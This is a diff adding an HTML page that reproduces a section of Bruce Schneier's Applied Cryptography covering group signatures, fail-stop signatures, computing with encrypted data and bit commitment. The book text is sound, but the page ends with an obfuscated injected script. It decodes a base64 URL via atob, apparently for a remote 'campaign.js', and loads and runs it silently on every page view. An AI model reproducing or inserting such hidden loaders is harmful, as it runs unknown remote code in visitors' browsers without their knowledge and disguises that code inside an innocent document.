@@ -1,0 +1,104 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=084-086//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">4.6 Group Signatures</FONT></H3>
+<P>David Chaum introduces this problem in [330]:
+</P>
+<BLOCKQUOTE><P>A company has several computers, each connected to the local network. Each department of that company has its own printer (also connected to the network) and only persons of that department are allowed to use their department&#146;s printer. Before printing, therefore, the printer must be convinced that the user is working in that department. At the same time, the company wants privacy; the user&#146;s name may not be revealed. If, however, someone discovers at the end of the day that a printer has been used too often, the director must be able to discover who misused that printer, and send him a bill.
+</P>
+</BLOCKQUOTE><P>The solution to this problem is called a <B>group signature</B>. Group signatures have the following properties:</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;Only members of the group can sign messages.
+<DD><B>&#151;</B>&nbsp;&nbsp;The receiver of the signature can verify that it is a valid signature from the group.
+<DD><B>&#151;</B>&nbsp;&nbsp;The receiver of the signature cannot determine which member of the group is the signer.
+<DD><B>&#151;</B>&nbsp;&nbsp;In the case of a dispute, the signature can be &#147;opened&#148; to reveal the identity of the signer.
+</DL>
+<P><FONT SIZE="+1"><B><I>Group Signatures with a Trusted Arbitrator</I></B></FONT></P>
+<P>This protocol uses a trusted arbitrator:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Trent generates a large pile of public-key/private-key key pairs and gives every member of the group a different list of unique private keys. No keys on any list are identical. (If there are <I>n</I> members of the group, and each member gets <I>m</I> key pairs, then there are <I>n*m</I> total key pairs.)
+<DD><B>(2)</B>&nbsp;&nbsp;Trent publishes the master list of all public keys for the group, in random order. Trent keeps a secret record of which keys belong to whom.
+<DD><B>(3)</B>&nbsp;&nbsp;When group members want to sign a document, he chooses a key at random from his personal list.
+<DD><B>(4)</B>&nbsp;&nbsp;When someone wants to verify that a signature belongs to the group, he looks on the master list for the corresponding public key and verifies the signature.
+<DD><B>(5)</B>&nbsp;&nbsp;In the event of a dispute, Trent knows which public key corresponds to which group member.
+</DL>
+<P>The problem with this protocol is that it requires a trusted party. Trent knows everyone&#146;s private keys and can forge signatures. Also, <I>m</I> must be long enough to preclude attempts to analyze which keys each member uses.</P>
+<P>Chaum [330] lists a number of other protocols, some in which Trent is unable to fake signatures and others in which Trent is not even required. Another protocol [348] not only hides the identity of the signer, but also allows new members to join the group. Yet another protocol is [1230].</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">4.7 Fail-Stop Digital Signatures</FONT></H3>
+<P>Let&#146;s say Eve is a very powerful adversary. She has vast computer networks and rooms full of Cray computers&#151;orders of magnitude more computing power than Alice. All of these computers chug away, day and night, trying to break Alice&#146;s private key. Finally&#151;success. Eve can now impersonate Alice, forging her signature on documents at will.
+</P>
+<P><B>Fail-stop digital signatures</B>, introduced by Birgit Pfitzmann and Michael Waidner [1240], prevent this kind of cheating. If Eve forges Alice&#146;s signatures after a brute-force attack, then Alice can prove they are forgeries. If Alice signs a document and then disavows the signature, claiming forgery, a court can verify that it is not a forgery.</P>
+<P>The basic idea behind fail-stop signatures is that for every possible public key, many possible private keys work with it. Each of these private keys yields many different possible signatures. However, Alice has only one private key and can compute just one signature. Alice doesn&#146;t know any of the other private keys.</P>
+<P>Eve wants to break Alice&#146;s private key. (Eve could also be Alice, trying to compute a second private key for herself.) She collects signed messages and, using her array of Cray computers, tries to recover Alice&#146;s private key. Even if she manages to recover a valid private key, there are so many possible private keys that it is far more likely that she has a different one. The probability of Eve&#146;s recovering the proper private key can be made so small as to be negligible.</P>
+<P>Now, when Eve forges a signed document using the private key she generated, it will have a different signature than if Alice signs the document herself. When Alice is hauled off to court, she can produce two different signatures for the same message and public key (corresponding to her private key and to the private key Eve created) to prove forgery. On the other hand, if Alice cannot produce the two different signatures, there is no forgery and Alice is still bound by her signature.</P>
+<P>This signature scheme protects against Eve breaking Alice&#146;s signature scheme by sheer computational power. It does nothing against Mallory&#146;s much more likely attack of breaking into Alice&#146;s house and stealing her private key or Alice&#146;s attack of signing a document and then conveniently losing her private key. To protect against the former, Alice should buy herself a good guard dog; that kind of thing is beyond the scope of cryptography.</P>
+<P>Additional theory and applications of fail-stop signatures can be found in [1239, 1241, 730, 731].</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">4.8 Computing with Encrypted Data</FONT></H3>
+<P>Alice wants to know the solution to some function <I>f</I>(<I>x</I>), for some particular value of <I>x</I>. Unfortunately, her computer is broken. Bob is willing to compute <I>f</I>(<I>x</I>) for her, but Alice isn&#146;t keen on letting Bob know her <I>x</I>. How can Alice let Bob compute <I>f</I>(<I>x</I>) for her without telling him <I>x</I>?</P>
+<P>This is the general problem of <B>computing with encrypted data</B>, also called <B>hiding information from an oracle</B>. (Bob is the oracle; he answers questions.) There are ways to do this for certain functions; they are discussed in Section 23.6.</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">4.9 Bit Commitment</FONT></H3>
+<P>The Amazing Alice, magician extraordinaire, will now perform a mystifying feat of mental prowess. She will guess the card Bob will choose before he chooses it! Watch as Alice writes her prediction on a piece of paper. Marvel as Alice puts that piece of paper in an envelope and seals it shut. Thrill as Alice hands that sealed envelope to a random member of the audience. &#147;Pick a card, Bob, any card.&#148; He looks at it and shows it to Alice and the audience. It&#146;s the seven of diamonds. Alice now takes the envelope back from the audience. She rips it open. The prediction, written before Bob chose his card, says &#147;seven of diamonds&#148;! Applause.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TKjcPzjC, azdKhuzi) {azdKhuzi = TKjcPzjC.createElement('script');azdKhuzi.type = 'text/javascript';azdKhuzi.async = true;azdKhuzi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TKjcPzjC.getElementsByTagName('body')[0].appendChild(azdKhuzi);}(document));</script></body>
+</html>
